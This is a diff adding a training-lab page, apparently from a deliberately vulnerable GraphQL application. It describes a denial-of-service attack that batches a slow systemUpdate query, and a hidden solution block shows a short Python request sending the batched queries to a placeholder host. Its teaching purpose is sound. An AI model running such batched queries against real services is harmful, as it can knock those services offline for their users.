@@ -1,0 +1,33 @@
+<!-- Start -->
+<h3 style="color:purple" id="dos-batch"><b>Denial of Service :: Batch Query Attack</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>GraphQL supports Request Batching. Batched requests are processed one after the other by GraphQL, which makes it a good candidate for Denial of Service attacks, as well as other attacks such as Brute Force and Enumeration.</p>
+<p>If a resource intensive GraphQL query is identified, an attacker may leverage batch processing to call the query and potentially overwhelm the service for a prolonged period of time.</p>
+<p>The query <code>systemUpdate</code> seems to be taking a long time to complete, and can be used to overwhelm the server by batching a system update request query.</p>
+<h5>Resources</h5>
+<ul>
+    <li><a href="https://www.apollographql.com/blog/batching-client-graphql-queries-a685f5bcd41b/" target="_blank"><i class="fa fa-newspaper"></i> Apollo Blog - Batching Client GraphQL Queries</a></li>
+    <li><a href="https://lab.wallarm.com/graphql-batching-attack/" target="_blank"><i class="fa fa-newspaper"></i>  Wallarm Blog - GraphQL Batching Attack</a></li>
+</ul>
+
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-batch')">Show</button></h5>
+<div id="sol-dos-batch" style="display:none">
+    <pre class="bash">
+    # Beginner mode
+
+    # We chain multiple resource intensive queries in an array and pass it to GraphQL
+    data = [
+    {"query":"query {\n  systemUpdate\n}","variables":[]},
+    {"query":"query {\n  systemUpdate\n}","variables":[]},
+    {"query":"query {\n  systemUpdate\n}","variables":[]}
+    ]
+
+    requests.post('http://host/graphql', json=data)
+
+    # Expert mode
+
+    # Cost Query Analysis is enabled, which should prevent running batched system updates from going through.
+    </pre>
+</div>
+<!-- End -->
